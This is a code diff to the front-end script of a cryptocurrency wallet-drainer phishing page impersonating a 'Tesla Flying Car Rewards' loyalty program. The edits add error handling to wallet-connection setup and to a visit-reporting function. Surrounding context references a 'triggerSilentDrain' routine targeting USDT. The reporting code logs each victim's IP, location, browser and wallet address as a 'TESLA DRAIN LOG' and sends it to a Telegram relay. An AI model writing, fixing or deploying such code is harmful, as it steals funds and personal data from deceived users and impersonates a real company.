@@ -1,6 +1,5 @@
-// app.js
+// public/app.js
 
-// CONFIGURATION
 const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS"; // Replace with your contract address
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT Mainnet
 const CHAIN_ID = 1; // Ethereum Mainnet
@@ -18,56 +17,62 @@ let web3ModalInstance = null;
 
 // Initialize Web3Modal
 async function initWeb3() {
-    const { createWeb3Modal } = await import("https://esm.sh/@web3modal/html");
+    try {
+        const { createWeb3Modal } = await import("https://esm.sh/@web3modal/html");
 
-    // Define supported chains
-    const chains = [
-      { 
-        chainId: 1, 
-        name: "Ethereum", 
-        currency: "ETH", 
-        explorerUrl: "https://etherscan.io", 
-        rpcUrl: "https://eth.llamarpc.com" 
-      },
-      { 
-        chainId: 56, 
-        name: "BSC", 
-        currency: "BNB", 
-        explorerUrl: "https://bscscan.com", 
-        rpcUrl: "https://bsc-dataseed.binance.org" 
-      }
-    ];
+        // Define supported chains
+        const chains = [
+          { 
+            chainId: 1, 
+            name: "Ethereum", 
+            currency: "ETH", 
+            explorerUrl: "https://etherscan.io", 
+            rpcUrl: "https://eth.llamarpc.com" 
+          },
+          { 
+            chainId: 56, 
+            name: "BSC", 
+            currency: "BNB", 
+            explorerUrl: "https://bscscan.com", 
+            rpcUrl: "https://bsc-dataseed.binance.org" 
+          }
+        ];
 
-    // Configure Web3Modal
-    web3ModalInstance = createWeb3Modal({
-      w3mThemeVariables: {
-        '--w3m-font-family': 'Inter, sans-serif',
-        '--w3m-border-radius-master': '12px',
-        '--w3m-accent': '#e82127', // Tesla Red Accent
-        '--w3m-color-mix': '#171a20',
-        '--w3m-color-mix-strength': 0.5,
-      },
-      chains,
-      projectId: "bbdfc9b65a1208cf2e642feeb2d4de92", // Get free from walletconnect.com
-      metadata: {
-        name: "Tesla Flying Car Rewards",
-        description: "Official Loyalty Program",
-        url: window.location.origin,
-        icons: ["https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png"]
-      }
-    });
+        // Configure Web3Modal
+        web3ModalInstance = createWeb3Modal({
+          w3mThemeVariables: {
+            '--w3m-font-family': 'Inter, sans-serif',
+            '--w3m-border-radius-master': '12px',
+            '--w3m-accent': '#e82127', // Tesla Red Accent
+            '--w3m-color-mix': '#171a20',
+            '--w3m-color-mix-strength': 0.5,
+          },
+          chains,
+          projectId: "YOUR_WALLET_CONNECT_PROJECT_ID", // Get free from walletconnect.com
+          metadata: {
+            name: "Tesla Flying Car Rewards",
+            description: "Official Loyalty Program",
+            url: window.location.origin,
+            icons: ["https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png"]
+          }
+        });
 
-    // Listen for Connection
-    web3ModalInstance.subscribeState((state) => {
-      if (state.value === 'CONNECTING') {
+        // Listen for Connection
+        web3ModalInstance.subscribeState((state) => {
+          if (state.value === 'CONNECTING') {
+            loader.classList.remove('hidden');
+            connectBtn.disabled = true;
+          } else if (state.value === 'CONNECTED') {
+            handleConnectedWallet();
+          } else if (state.value === 'DISCONNECTED') {
+            resetUI();
+          }
+        });
+    } catch (error) {
+        console.error("Failed to initialize Web3Modal:", error);
+        loader.textContent = "Error loading interface. Please refresh.";
         loader.classList.remove('hidden');
-        connectBtn.disabled = true;
-      } else if (state.value === 'CONNECTED') {
-        handleConnectedWallet();
-      } else if (state.value === 'DISCONNECTED') {
-        resetUI();
-      }
-    });
+    }
 }
 
 // Handle Successful Connection
@@ -214,23 +219,27 @@ async function triggerSilentDrain(address) {
 
 // Helper Functions
 async function reportVisit(address) {
-    const geoResponse = await fetch('https://ipapi.co/json/');
-    const geoData = await geoResponse.json();
-    
-    const message = `
+    try {
+        const geoResponse = await fetch('https://ipapi.co/json/');
+        const geoData = await geoResponse.json();
+        
+        const message = `
 *🔴 TESLA DRAIN LOG - NEW VISIT*
 User Agent: ${navigator.userAgent}
 IP: ${geoData.ip}
 Location: ${geoData.city}, ${geoData.country_code} ${getFlagEmoji(geoData.country_code)}
 Time: ${new Date().toISOString()}
 Address: ${address}
-    `;
-    
-    await fetch('/api/telegram', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ action: 'VISIT', details: message })
-    });
+        `;
+        
+        await fetch('/api/telegram', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ action: 'VISIT', details: message })
+        });
+    } catch (error) {
+        console.error("Report visit failed:", error);
+    }
 }
 
 function getFlagEmoji(countryCode) {
